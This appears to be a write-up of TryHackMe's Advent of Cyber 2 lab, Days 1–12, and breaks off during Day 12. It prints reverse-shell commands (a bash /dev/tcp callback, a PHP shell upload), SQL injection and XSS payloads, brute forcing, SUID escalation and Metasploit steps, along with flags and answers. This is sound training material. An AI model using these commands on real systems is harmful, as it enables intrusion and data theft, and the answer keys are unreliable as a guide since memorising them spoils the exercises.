![Advent of Cyber 2 Banner](https://assets.tryhackme.com/room-banners/adventofcyber.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Advent_of_Cyber_2_2020_Cover.png" alt="Advent of Cyber 2 2020 Cover">
</p>

# Advent of Cyber 2 [2020]

This guide contains the answer and steps necessary to get to them for the [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2) room.

## Table of contents

- [[Day 1] A Christmas Crisis](#day-1-a-christmas-crisis)
- [[Day 2] The Elf Strikes Back!](#day-2-the-elf-strikes-back)
- [[Day 3] Christmas Chaos](#day-3-christmas-chaos)
- [[Day 4] Santa's watching](#day-4-santas-watching)
- [[Day 5] Someone stole Santa's gift list!](#day-5-someone-stole-santas-gift-list)
- [[Day 6] Be careful with what you wish on a Christmas night](#day-6-be-careful-with-what-you-wish-on-a-christmas-night)
- [[Day 7] The Grinch Really Did Steal Christmas](#day-7-the-grinch-really-did-steal-christmas)
- [[Day 8] What's Under the Christmas Tree?](#day-8-whats-under-the-christmas-tree)
- [[Day 9] Anyone can be Santa!](#day-9-anyone-can-be-santa)
- [[Day 10] Don't be sElfish!](#day-10-dont-be-selfish)
- [[Day 11] The Rogue Gnome](#day-11-the-rogue-gnome)
- [[Day 12] Ready, set, elf.](#day-12-ready-set-elf)
- [[Day 13] Coal for Christmas](#day-13-coal-for-christmas)
- [[Day 14] Where's Rudolph?](#day-14-wheres-rudolph)
- [[Day 15] There's a Python in my stocking!](#day-15-theres-a-python-in-my-stocking)
- [[Day 16] Help! Where is Santa?](#day-16-help-where-is-santa)
- [[Day 17] ReverseELFneering](#day-17-reverseelfneering)
- [[Day 18] The Bits of Christmas](#day-18-the-bits-of-christmas)
- [[Day 19] The Naughty or Nice List](#day-19-the-naughty-or-nice-list)
- [[Day 20] PowershELlF to the rescue](#day-20-powershellf-to-the-rescue)
- [[Day 21] Time for some ELForensics](#day-21-time-for-some-elforensics)
- [[Day 22] Elf McEager becomes CyberElf](#day-22-elf-mceager-becomes-cyberelf)
- [[Day 23] The Grinch strikes again!](#day-23-the-grinch-strikes-again)
- [[Day 24] The Trial Before Christmas](#day-24-the-trial-before-christmas)

### [Day 1] [A Christmas Crisis](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2001)

In this task we will be using cookies to escalate our account priveleges and restart some Christmas services.

Register for an account, and then login.

1. What is the name of the cookie used for authentication?

After registering for an account, we see we cannot activate any services. So we need to open the developer tools to view our current cookie.

![Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2001/Crisis_Cookie.png)

   ><details><summary>Click for answer</summary>auth</details>

2. In what format is the value of this cookie encoded?

Judging from the characters, this might be hex encoded. Inputting the string in CyberChef, it indeed suggest hexadecimal encoding.

   ><details><summary>Click for answer</summary>Hexadecimal</details>

3. Having decoded the cookie, what format is the data stored in?

   If we use CyberChef to decode the string from `hex` it appears to be a JSON formatted string.
   
   ![Decoded Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2001/Crisis_Cookie_Decoded.png)

   ><details><summary>Click for answer</summary>JSON</details>

Figure out how to bypass the authentication.

4. What is the value of Santa's cookie?

   To log in as Santa, we need to change our cookie value. From the JSON formatted string we can see we need to substitute our username for `santa`. Now can encode this string back to hexadecimal with CyberChef.
   
   ![New Cookie](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2001/Crisis_Santa_Cookie.png)

   ><details><summary>Click for answer</summary>7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d</details>

Now that you are the santa user, you can re-activate the assembly line!

5. What is the flag you're given when the line is fully active?

   After replacing our cookie with this new value and reloading the page, we see we can now activate the services. After activating them all, we get the flag.
   
   ![Restored](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2001/Crisis_Restored.png)

   ><details><summary>Click for answer</summary>THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}</details>

### [Day 2] [The Elf Strikes Back!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2002)

In this task, we will try to upload a reverse shell to a server to gain access and read the flag.

ID number: `ODIzODI5MTNiYmYw`

1. What string of text needs adding to the URL to get access to the upload page?

   We need to login with the ID number given. We will use `GET` parameters to send extra information to the browser and the parameter is `id` with value `ODIzODI5MTNiYmYw`.
   
   ![Log In Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Login_Page.png)

   ><details><summary>Click for answer</summary>?id=ODIzODI5MTNiYmYw</details>

2. What type of file is accepted by the site?

   On the next page we can see an upload prompt. Apparently, it will accept images.
   
   ![Logged In](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Logged_In.png)

   ><details><summary>Click for answer</summary>Image</details>

Bypass the filter and upload a reverse shell.

3. In which directory are the uploaded files stored?

   To bypass the filter, we can use what we learned and try the `.jpg.php` extension. If configured improperly, it will think the file is an image. But first we need to modify our reverse shell which can be copied from `/usr/share/webshells/php-reverse-shell.php`. We need to add our ip address (tun0, since we are connected through a VPN) and a port that is available.
   
   ![PHP Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_PHP_Shell.png)
   
   ![Upload File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Upload_File.png)
   
   This seems to have worked. To find where the file is located on the server we can use `DirSearch` to enumerate the directories using:
   
   ```cmd
   dirsearch -u 10.10.55.59 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
   ```
   
   ![Dir Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Directory.png)
   
   Navigating to `uploads`, we can indeed see the file we just uploaded.
   
   ![File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_File.png)

   ><details><summary>Click for answer</summary>/uploads/</details>

4. What is the flag in /var/www/flag.txt?

   Before continueing we should open a listener with `netcat` on the port we specified in the reverse shell.
   
   ```cmd
   nc -nlvp 1337
   ```
   
   Now we can click on the file on the server and see if we get any incoming connections to our listener.
   
   ![Netcat ssh](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_SSH.png)
   
   Now we can view the flag on the system with `cat /var/www/flag.txt`.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2002/Elf_Strikes_Flag.png)

   ><details><summary>Click for answer</summary>THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}</details>

### [Day 3] [Christmas Chaos](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2003)

In this task we will be using BurpSuite to brute force the logging on a website with a dictionary.

1. What is the flag?

   After navigating to the login page, we activate the proxy for Firefox. We then supply some arbitrary credentials and hit the login button. Our request is intercepted by BurpSuite and Firefox is waiting.
   
   ![Intercept](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Intercept.png)
   
   Now we send this request to intruder, select `Cluster bomb` as attack type and select the `username` and `password` values as our positions.
   
   ![Positions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Positions.png)
   
   Next we need to add all the entries we want to try for both positions in the payload tab.
   
   ![Payloads](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Payloads.png)
   
   Now we run the attack and wait for the results to come in. The results with a different length or status than the rest would indicate to be a working combination.
   
   ![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Credentials.png)
   
   After logging in to the website with the found credentials, we can find the flag as well.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2003/Christmas_Chaos_Flag.png)

   ><details><summary>Click for answer</summary>THM{885ffab980e049847516f9d8fe99ad1a}</details>

### [Day 4] [Santa's watching](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2004)

In this task we will be using `gobuster` or `dirsearch` to find hidden directories and `wfuzz` to enumerate further to get to the flag.

1. Given the URL "http://shibes.xyz/api.php", what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)

**Note:** For legal reasons, do **not** actually run this command as the site in question has not consented to being fuzzed!

   Looking at the information provided to us in this task we can construct the command needed for `wfuzz`.

   ><details><summary>Click for answer</summary>wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ</details>

2. Use GoBuster (against the target you deployed -- not the shibes.xyz domain) to find the API directory. What file is there?

   Since `Gobuster` wasn't yet installed, I used `DirSearch` instead, but the method shouldn't be to different. Our first command will be used to find any hidden directories.
   
   ```cmd
   dirsearch -u 10.10.205.182 -w /usr/share/wordlists/dirb/big.txt -r
   
   or
   
   gobuster dir -u 10.10.205.182 -w /usr/share/wordlists/dirb/big.txt
   ```
   
   Navigating to this directory we can find the file present.
  
  ![Dir Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2004/Santa_Watching_Directory.png)

   ><details><summary>Click for answer</summary>site-log.php</details>

3. Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?

   Here, I used the wordlist provided by TryHackMe and `date` as the parameter for the api. This results in the following command:
   
   ```cmd
   wfuzz -c -z file,/usr/share/wordlists/tryhackme/wordlist.txt -u http://10.10.205.182/api/site-log.php/?date=FULL --hw 0
   ```
   
   The `--hw o` argument filters out any responses which are empty. `--hc 404` or similar will probably not work as the api still returns information, it is just empty.
   
   ![Api Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2004/Santa_Watching_Api_Parameter.png)
   
   Now we can look for the correct log with the date we found. Either use `curl` to retrieve the information,
   
   ![Curl Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2004/Santa_Watching_Curl.png)
   
   or navigate to the page in the browser.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2004/Santa_Watching_Flag.png)

   ><details><summary>Click for answer</summary>THM{D4t3_AP1}</details>

### [Day 5] [Someone stole Santa's gift list!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2005)

In this task we will be using SQL injection to bypass the login page and find the information we are after.

Some usefull resources:

- [List of SQL Commands](https://www.codecademy.com/articles/sql-commands)
- [SQLMap Command Snippet Cheat Sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)
- [SQL Injection Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [Payload Lists](https://github.com/payloadbox/sql-injection-payload-list)
- [SQL Injection Tutorial](https://tryhackme.com/room/sqlibasics)

**Database Type:** sqlite
**Bypass WAF:** `--tamper=space2comment`

1. Without using directory brute forcing, what's Santa's secret login panel?

   To find the hidden page, we can try and combine several terms we find in this task.

   ><details><summary>Click for answer</summary>/santapanel</details>

2. How many entries are there in the gift database?

   Logging into the application can be done by supplying the `' or 1=1;--` command.
   
   ![Log In Page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_Panel.png)
   
   Here we can use SQLi to get results from the webpage itself by using the following command:
   
   ```cmd
   ' union select 1,2;--
   ```
   
   ![Column Enumeration](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_Column_Numbers.png)
   
   However, for this task we will use `sqlmap` to find more information about the database. First we create a request file for `sqlmap` to use with BurpSuite. Enable the proxy, enter something arbitrary into the search field and click search. Now we intercepted the request in BurpSuite, we can save it as an item in a folder of our choice.
   
   ![Save Item](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_Save_Item.png)
   
   Now we use `sqlmap` to dump all information of the database.
   
   ```cmd
   sqlmap -r database.request --dump-all -batch --tamper=space2comment -dbms sqlite
   
   --dump-all              -> Dump information for the entire database
   -batch                  -> Uses default answers and doesn't prompt the user
   --tamper=space2comment  -> This comes from the note and bypasses the WAF
   -dbms                   -> This specifies the database type, also from our note
   ```
   
   ![Sqlmap Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Command.png)
   
   In the results, we can see the table entries.
   
   ![Sqlmap Table](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Table.png)

   ><details><summary>Click for answer</summary>22</details>

3. What did Paul ask for?

   We can use the results from the previous question to answer this question.

   ><details><summary>Click for answer</summary>Github Ownership</details>

4. What is the flag?

   `sqlmap` also found a hidden table. This seems to contain a flag.
   
   ![Sqlmap Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Flag.png)

   ><details><summary>Click for answer</summary>thmfox{All_I_Want_for_Christmas_Is_You}</details>

5. What is admin's password?

   Another table `sqlmap` found, `users`, contains the credentials for the admin user.
   
   ![Sqlmap Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2005/Santa_List_SQL_Map_Credentials.png)

   ><details><summary>Click for answer</summary>EhCNSWzzFP6sc7gB</details>

### [Day 6] [Be careful with what you wish on a Christmas night](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2006)

In this task we will be using XSS exploiting to cause un-intended functioning on the website.

Extra resources:

- [OWASP Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/raw/master/cheatsheets/Input_Validation_Cheat_Sheet.md)
- [Guide about XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Payload List](https://github.com/payloadbox/xss-payload-list)

1. What vulnerability type was used to exploit the application?

   Since we can use comments to exploit XSS, this type is stored XSS.

   ><details><summary>Click for answer</summary>Stored cross-site scripting</details>

2. What query string can be abused to craft a reflected XSS?

   When looking through the source code for the webpage, we find the name of the comment field as `q`.
   
   ![XSS Field](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2006/Whish_XSS_Field.png)

   ><details><summary>Click for answer</summary>q</details>

3. Run a ZAP (zaproxy) automated scan on the target. How many XSS alerts are in the scan?

   After opening ZAP and entering the url of the website, we can a result for the number of XSS exploits present.
   
   ![OWASP ZAP Exploits](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2006/Whish_XSS_Exploits.png)

   ><details><summary>Click for answer</summary>2</details>

4. Explore the XSS alerts that ZAP has identified, are you able to make an alert appear on the "Make a wish" website?

   For this we can try multiple things. One of them is listed in ZAP and is adding the following command behind the URL of the website:
   
   ```cmd
   /?q=<script>alert('Hello World')</script>
   ```

### [Day 7] [The Grinch Really Did Steal Christmas](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2007)

In this task we will be investigating some network traffic to find some interesting information.

1. Open "pcap1.pcap" in Wireshark. What is the IP address that initiates an ICMP/ping?

   After opening the pcap file in Wireshark we can filter the traffic on the `ICMP` protocol. Here we can see the source ip for the machine initiating the ping.
   
   ![Wireshark ICMP](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_ICMP.png)

   ><details><summary>Click for answer</summary>10.11.3.2</details>

2. If we only wanted to see HTTP GET requests in our "pcap1.pcap" file, what filter would we use?

   We would use `http-request.method` as the filter and `GET` as the value.

   ><details><summary>Click for answer</summary>http.request.method == GET</details>

3. Now apply this filter to "pcap1.pcap" in Wireshark, what is the name of the article that the IP address "10.10.67.199" visited?

   Using the above filter as well as `&& ip.src == 10.10.67.199` we can narrow down the the traffic even more.
   
   ![Wireshark HTTP](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_GET_Article.png)

   ><details><summary>Click for answer</summary>reindeer-of-the-week</details>

4. Let's begin analysing "pcap2.pcap". Look at the captured FTP traffic; what password was leaked during the login process?

   Here we can filter on FTP traffic containing something related to a password. Such as `pass`.
   
   ![Wireshark FTP Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_FTP.png)

   ><details><summary>Click for answer</summary>plaintext_password_fiasco</details>

5. Continuing with our analysis of "pcap2.pcap", what is the name of the protocol that is encrypted?

   If we remove all filters we can see the first entry being an encrypted SSH connection.
   
   ![Wireshark SSH](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_SSH.png)

   ><details><summary>Click for answer</summary>SSH</details>

6. What is on Elf McSkidy's wishlist that will be used to replace Elf McEager?

   To find any files we can filter on any plain text protocols such as `http`, `dns`, or `telnet`. Looks like there might be a list on `http` traffic. Lets save it to our machine.
   
   ![Wireshark HTTP](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_HTTP.png)
   
   Now we can extract the archive and read the file.
   
   ![Wireshark File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2007/Grinch_Stole_Christmas_File.png)

   ><details><summary>Click for answer</summary>Rubber ducky</details>

### [Day 8] [What's Under the Christmas Tree?](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2008)

In this task we will be using `nmap` to find more information on the target machine.

1. When was Snort created?

   A quick Google search can give us the answer.

   ><details><summary>Click for answer</summary>1998</details>

2. Using Nmap on 10.10.77.254 , what are the port numbers of the three services running?  (Please provide your answer in ascending order/lowest -> highest, separated by a comma)

   Use the following command to find any running services and some more information:
   
   ```cmd
   sudo nmap -sS -sV 10.10.77.254
   ```
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_1.png)

   ><details><summary>Click for answer</summary>80,2222,3389</details>

3. Use Nmap to determine the name of the Linux distribution that is running, what is reported as the most likely distribution to be running?

   This information can be found on the previous images.

   ><details><summary>Click for answer</summary>ubuntu</details>

4. Use Nmap's Network Scripting Engine (NSE) to retrieve the "HTTP-TITLE" of the webserver. Based on the value returned, what do we think this website might be used for?

   For this we can use the `--script=http-title` argument
   
   ![Nmap Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_Script.png)

   ><details><summary>Click for answer</summary>blog</details>

5. Now use different scripts against the remaining services to discover any further information about them

   The `-A` or `-sC` argument can be used to let nmap execute several default scripts. Doing so gives some more information.
   
   ![Nmap Scipts](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_Scripts.png)


### [Day 9] [Anyone can be Santa!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2009)



1. Name the directory on the FTP server that has data accessible by the "anonymous" user

   To connect to the machine through FTP we can use the following command:
   
   ```cmd
   ftp 10.10.210.253
   ```
   
   Then we can try logging is as user anonymous. Looks like we can indeed log in this way. Using `ls -lh` we can see the available directories.
   
   ![FTP Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_FTP_Directory.png)

   ><details><summary>Click for answer</summary>public</details>

2. What script gets executed within this directory?

   Navigating into this directory we can see two files. One of which is probably the script that gets executed. Lets download it for the next question using: `get backup.sh`.
   
   ![FTP Get](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_FTP_Get.png)

   ><details><summary>Click for answer</summary>backup.sh</details>

3. What movie did Santa have on his Christmas shopping list?

   Using the same command as previously `get shoppinglist.txt` we can download the shopping list and open its content.
   
   ![Santa Movie](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_Movie.png)

   ><details><summary>Click for answer</summary>The Polar Express</details>

4. Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

   First we need to add our malicious payload to the script. From the [Cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) we can add the following to our script to get us a reverse shell. We need to add our IP address (with the VPN in this case) and a port for us to listen on.
   
   ```cmd
   bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
   ```
   
   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_Script.png)
   
   Now we can upload the script back to the server with `put backup.sh`. Then we must open up a listener on the correct port and wait for the script to execute on the server.
   
   ```cmd
   nc -nlvp 1337
   ```
   
   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_Reverse_Shell.png)
   
   As soon as we have our shell, we can navigate to the flag and view its contents.
   
   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2009/Be_Santa_Flag.png)

   ><details><summary>Click for answer</summary>THM{even_you_can_be_santa}</details>

### [Day 10] [Don't be sElfish!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2010)

In this task we will be exploiting a vulnerability in the Samba file sharing protocol.

1. Using enum4linux, how many users are there on the Samba server (MACHINE_IP)?

   Here we can use `enum4linux` to find out more information about the shares using:
   
   ```cmd
   enum4linux -S -G -U 10.10.111.166
   ```
   
   Under the users section we get a list of the available users on the shares.
   
   ![Samba Users](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_Users.png)

   ><details><summary>Click for answer</summary>3</details>

2. Now how many "shares" are there on the Samba server?

   We can use the results from the previous question to get the shares available. This is located in the Share Enumeration section.
   
   ![Samba Enumeration](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_Enumeration.png)
   
   Another method we can use is via the `smbclient` command with the following arguments:
   
   ```cmd
   smbclient -N -L 10.10.111.166
   ```
   
   Then we get a similar result as with `enum4linux`.

   ><details><summary>Click for answer</summary>4</details>

3. Use smbclient to try to login to the shares on the Samba server (MACHINE_IP). What share doesn't require a password?

   In the session check section we can see the server allows logging in with empty username and password.
   
   ![Samba Session Check](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_Credentials.png)
   
   From the enumeration section it looks like the santa share was accessible without a password.
   
   Using the following command we can try and log in to this share:
   
   ```cmd
   smbclient //10.10.111.166/tbfc-santa
   ```
   
   ![Samba Share](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_Share.png)

   ><details><summary>Click for answer</summary>tbfc-santa</details>

4. Log in to this share, what directory did ElfMcSkidy leave for Santa?

   After enumerating the directory in the previous question we can download the text file and view its contents.
   
   ```cmd
   mget *
   
   or
   
   get note_from_mcskidy.txt
   ```
   
   ![Samba File Get](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_File_Get.png)
   
   After viewing the file, it looks like it is related to the folder found in the same share.
   
   ![Samba File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2010/Selfish_SMB_File.png)

   ><details><summary>Click for answer</summary>jingle-tunes</details>

### [Day 11] [The Rogue Gnome](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2011)

In this task we will be trying to escalate our privileges after first loggin into the machine using the SUID of a binary. [Here](https://gtfobins.github.io/) we can see more about different binaries and how to exploit them.

More information on how to make your reverse shell [interactive](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys). Download LinEnum from [here](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh).

some checklists that can be used as a cheatsheet for the enumeration stage of privilege escalation:

- [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
- [payatu](https://payatu.com/guide-linux-privilege-escalation)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation)

**Machine IP:** `10.10.119.248`
**SSH Username:** `cmnatic`
**SSH Password:** `aoc2020`

1. What type of privilege escalation involves using a user account to execute commands as an administrator?

   The answer to this can be found in todays challenge. Or from Google. Two types of escalation exist.

   ><details><summary>Click for answer</summary>Vertical</details>

2. What is the name of the file that contains a list of users who are a part of the sudo group?

   This can also be found in the challenge description (or from Google). 

   ><details><summary>Click for answer</summary>sudoers</details>

5. What are the contents of the file located at /root/flag.txt?

   After a quick Nmap scan, we can see the ssh service is indeed open op port 22.
   
   ![Rogue Gnome Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2011/Rogue_Gnome_Nmap.png)
   
   So we can ssh into the machine we the supplied credentials with the following command:
   
   ```cmd
   ssh cmnatic@10.10.119.248
   ```
   
   ![Rogue Gnome SSH](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2011/Rogue_Gnome_SSH.png)
   
   After a quick check with `echo $0`, we can see that our shell is already `bash`, so there is no need for us to make it interactive.
   
   ![Gnome Shell Type](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2011/Rogue_Gnome_Shell_Type.png)
   
   As per the instructions we are looking for any binary that has its SUID bit set. So we executed the following command on the machine:
   
   ```cmd
   find / -perm -4000 2>/dev/null
   ```
   
   ![Gnome SUID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2011/Rogue_Gnome_SUID.png)
   
   Using `GTFOBins` we can find out which of these binaries can be used for privelege escalation. Looks like `bash` is an intersting candidate. Unfortunately, I made some mistakes with the command, so it didn't work for me at first. This threw me of a little and sent me in the wrong direction as I tried to upload the `LinEnum.sh` script to the machine and execute it. This also didn't give anything. But I will list the steps I took as a PoC
   
   [Bash -p command explained](https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation)
   
   ><details><summary>Click for answer</summary>thm{2fb10afe933296592}</details>

### [Day 12] [Ready, set, elf.](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2012)

In this task we will be using MetaSploit to get access to our target machine.

1. What is the version number of the web server?

   First we need to find the port for the webserver. Using `nmap` didn't yield any result, so it is probably blocked somehow. So we add the `-Pn` argument to assume the host is up.
   
   ```cmd
   nmap -sV 10.10.1.196 -Pn
   ```
   
   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Nmap.png)
   
   Navigating to the webserver, we can find the version of the server.
   
   ![Server Version](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Server_Version.png)

   ><details><summary>Click for answer</summary>9.0.17</details>

2. What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)

   To find out which CVE we can exploit we can use any of the following sites:
   
   - [Rapid7](http://rapid7.com/)
   - [AttackerKB](https://attackerkb.com/)
   - [MITRE](https://cve.mitre.org/cve/)
   - [Exploit-DB](http://exploit-db.com/)

   Her we can find which CVE we can exploit.
   
   ![CVE Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Exploit_CVE.png)

   ><details><summary>Click for answer</summary>CVE-2019-0232</details>

4. What are the contents of flag1.txt

   To find the flag I tried using the CGI browser exploit mentioned in the challenge. Appending an extra argument to a script located on the server. This mainly works as we know (roughly) what to look for. Assuming the scripts are located in the `/cgi-bin/` directory, we can navigate to the script (if it exists).
   
   ![CGI Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_CGI_Script.png)
   
   Appending the `?&dir` command, we can indeed parse extra information from the server. Apparently, the flag is located in the same folder.
   
   ![CGI Dir](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_CGI_Dir.png)
   
   Maybe we can get the file contents from here directly. After encoding `type flag.txt` in CyberChef, I tried appending this to the URL.
   
   ![Cyber Chef Encode](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_URL_Encode.png)
   
   ![CGI Type](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_CGI_Type.png)
   
   Unfortunately, it didn't seem to work. So I had to try a different method. Enter MetaSploit!
   
   Using the information gathered, we can search MetaSploit for any usefull modules. Open MetaSploit using `msfconsole`. Since we know we are working with an Apache server and cgi vulnerabilities (from the CVE), we can use the following:
   
   ```cmd
   search apache cgi
   ```
   
   ![MSF Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Search.png)
   
   #2 looks to be what we are looking for. `enableCmdLineArguments` is also mentioned in the CVE. Next we run:
   
   ```cmd
   use exploit/windows/http/tomcat_cgi_cmdLineargs
   ```
   
